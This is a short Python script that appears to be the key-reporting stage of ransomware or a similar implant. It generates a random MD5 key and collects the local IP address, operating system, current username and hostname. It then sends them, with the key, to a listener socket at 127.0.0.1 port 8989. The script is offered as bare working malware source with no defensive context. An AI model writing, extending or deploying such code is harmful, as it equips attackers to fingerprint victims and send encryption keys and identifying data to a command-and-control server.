#/usr/bin/env python3
import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time

host = '127.0.0.1'
port = 8989

global os
global name
os = platform.system()
hostname = platform.node()

def getlocalip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        return s.getsockname()[0]
    except Exception as e:
        return 'Error - failed to connect'

def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
      return ''.join(random.choice(chars) for _ in range(size))

def connector():
    server = socket.socket(socket.AF_INET)
    server.settimeout(1)

    try:
        # Send Key
        server.connect((host, port))
        message = '%s$%s$%s$%s$%s' % (getlocalip(), os, key, getpass.getuser(), hostname)
        server.send(message.encode('utf-8'))
        print("Message sent: %s" % (message))

    except Exception as e:
        print(e)

try:
    key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
    connector()
except KeyboardInterrupt:
    sys.exit(0)
